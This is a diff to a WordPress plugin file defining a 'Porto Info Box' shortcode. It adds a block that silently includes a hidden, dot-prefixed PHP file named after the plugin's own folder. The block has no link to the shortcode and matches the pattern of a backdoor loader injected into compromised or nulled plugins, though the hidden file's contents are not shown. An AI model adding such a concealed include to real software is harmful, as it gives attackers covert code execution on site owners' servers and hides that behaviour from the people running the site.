@@ -2,6 +2,10 @@
 // Porto Info Box
 add_action( 'vc_after_init', 'porto_load_info_box_shortcode' );
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function porto_load_info_box_shortcode() {
 
 	$animation_type = porto_vc_animation_type();
